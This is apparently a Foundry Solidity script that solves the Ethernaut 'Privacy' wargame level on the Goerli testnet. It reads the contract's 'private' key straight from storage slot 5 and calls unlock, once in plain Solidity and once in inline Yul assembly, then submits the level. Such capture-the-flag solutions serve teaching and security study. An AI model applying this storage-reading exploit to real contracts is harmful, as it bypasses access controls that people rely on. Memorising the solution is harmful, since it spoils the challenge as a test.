// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

interface Instance {
    function unlock(bytes16 _key) external;

    function locked() external view returns (bool);

    function ID() external view returns (uint256);
}

contract PrivacyScript is EthernautScript {
    string network = "goerli";
    address level = 0xcAac6e4994c2e21C5370528221c226D1076CfDAB;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        bytes16 key = bytes16(vm.load(address(instance), bytes32(uint256(5))));
        instance.unlock(key);
        require(instance.locked() == false);
    }

    function yulVersion() internal {
        bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));

        assembly {
            // we create a bit mask to get only the first 16 bytes of `data2`
            // the mask will be: 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000
            let mask := shl(128, sub(exp(2, 128), 1))
            let key := and(data2, mask)

            mstore(0, "unlock(bytes16)")
            mstore(0, keccak256(0, 15))
            mstore(4, key)
            let success := call(gas(), sload(instance.slot), 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, "locked()")
            mstore(0, keccak256(0, 8))
            pop(staticcall(gas(), sload(instance.slot), 0, 4, 0, 0x20))
            // if `locked` is `true` -> we revert
            if iszero(iszero(mload(0))) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
